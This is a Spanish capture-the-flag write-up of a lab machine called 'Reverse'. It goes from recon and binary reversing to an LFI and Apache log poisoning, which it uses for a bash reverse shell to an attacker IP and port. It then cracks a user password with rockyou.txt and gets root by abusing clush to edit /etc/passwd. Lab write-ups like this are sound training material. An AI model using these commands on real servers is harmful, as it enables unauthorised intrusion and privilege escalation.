<h1>Laboratorio Reverse</h1>
<h2>Despleguamos el labotario reverse</h2>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-06 181834.png"/>

<h3>Realizamos un escaneo de nmap como parte del reconocimiento</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-06 181949.png"/>

<li>Puerto 80 activo</li>

<h3>Entramos al sitio web mediante el navegador colocando la direccion ip</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-06 182117.png"/>

<h3>Analizamos el código fuente y encontraremos un código de JavaScript</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-07 191339.png"/>

<h3>Analizando el código vemos que si hacemos 20 clicks en la web se visualizara una alerta "secret_dir"</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-07 191406.png"/>

<h3>Nos dirigimos a la ruta secret_dir y descargamos el archivo</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-07 191434.png"/>

<h3>Ejecutamos el archivo y veremos lo siguiente: </h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-07 192612.png"/>

<h3>Analizaremos con la herramienta ghidra el siguiente archivo para visualizar el contenido de una mejor forma</h3>
<h3>Dentro de la función containsRequiredChars encontramos estas siguientes cadenas y si las concatenamos forman: @MiS3cRetd00m</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 152302.png"/>

<h3>Ingresamos esa contraseña: @MiS3cRetd00m</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130211.png"/>

<h3>Encontramos un contenido en base64 la cual decodificaremos</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130323.png"/>

<h3>Encontramos un dominio y lo agregaremos a nano /etc/hosts</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130323.png"/>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130405.png"/>

<h3>Entramos al dominio a traves del navegador y nos vamos a la seccion "Experimentos Interactivos"</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130631.png"/>

<h3>Dentro de Experimentos Interactivos encontramos esto: </h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130642.png"/>

<h3>Dentro de la URL podemos realizar un LFI: http://g00dj0b.reverse.dl/experiments.php?module=/etc/passwd</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130722.png"/>

<li>LFI: vulnerabilidad que le permite a un atacante ejecutar y leer archivos internos del servidor</li>

<h3>Nos aprovecharemos de un Log poisoning</h3>
<h3>Dentro de la URL incluiremos esta ruta: http://g00dj0b.reverse.dl/experiments.php?module=/var/log/apache2/access.log</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 130822.png"/>

<li>Log poisoning: es una vulnerabilidad en la que se inyecta código malicioso o datos alterados dentro de los archivos de registro(logs)</li>

<h3>Para inyectar los archivos maliciosos usaremos la herramienta curl</h3>
<h3>Primero vamos a lanzar el comando whoami para ver si tenemos ejecución confirmada</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 131128.png"/>

<h3>Recargamos la pagina y vemos lo siguiente</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 131145.png"/>

<h3>Vemos que nos esta ejecutando comandos. Vamos a crearnos un nano shell.sh para ganar una reverse shell con el siguiente contenido: </h3>
<h3>bash -i >& /dev/tcp/[IP]/[PORT] 0>&1</h3>

<h3>Nos levantamos un servidor en python para inyectar la reverse shell dentro de los logs</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 131523.png"/>

<h3>Damos permisos de ejecución a la reverse shell</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 132101.png"/>

<h3>Nos ponemos en escucha por Netcat: nc -nlvp [PORT]</h3>
<h3>Ejecutamos la reverse shell</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 132204.png"/>

<h3>Actualizamos la pagina y reverse shell completada.</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 132328.png"/>

<h3>Hacemos el tratamiento de la TTY</h3>
<li>script /dev/null -c bash</li>
<li>ctrl + z</li>
<li>reset xterm</li>
<li>export SHELL=bash</li>
<li>export TERM=xterm</li>

<h3>Encontramos un usuario llamado nova y su contraseña se encuentra en el rockyou.txt</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 132547.png"/>

<h3>Desde nuestra maquina atacante nos creamos el siguiente script: </h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 143412.png"/>
<h3>Levantamos un servidor en python para pasar el script y el rockyou.txt.</h3>

<h3>Desde la maquina victima vamos al directorio /tmp y mediante wget obtenemos el script y el diccionario</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 132748.png"/>


<h3>Le damos permisos de ejecucion al script y ejecutamos</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 143529.png"/>

<h3>Y nos encontrara la contraseña</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 144140.png"/>

<h3>Ingresamos la contraseña.</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 144316.png"/>

<h3>Ahora somos el usuario nova.</h3>
<h3>Realizaremos un sudo -l para analizar binarios sudo</h3>
<h3>Encontramos un binario como sudo que lo puede ejecutar el usuario maci, aprovechando este binario lanzaremos una bash como el usuario maci</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 144521.png"/>

<h3>Para escalar privilegios nos aprovecharemos del binario /usr/bin/clush</h3>
<img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 144936.png"/>
<h3>ROOT OBTENIDO :)</h3>

<h2>Explicación de la escalada de privilegios</h2>
<h3>
clush (abreviación de ClusterShell) es una herramienta de administración de sistemas que sirve para ejecutar comandos al mismo tiempo en varias computadoras o servidores.

Esta herramienta tiene una función especial: si le pones un signo de exclamación (!) al inicio de una orden, te deja ejecutar comandos del sistema operativo con los mismos permisos con los que abriste el programa (es decir, como root).

Usando esa herramienta/Binario, ejecuta una orden interna (sed) para modificar un archivo clave del sistema donde se guardan los usuarios (/etc/passwd).
Después, lo que hizo ese comando fue buscar la cuenta de root y borrar la marca que indica que esa cuenta requiere contraseña en este caso la x.

</h3>


<h1>Creditos a: vareCruzz</h1>
















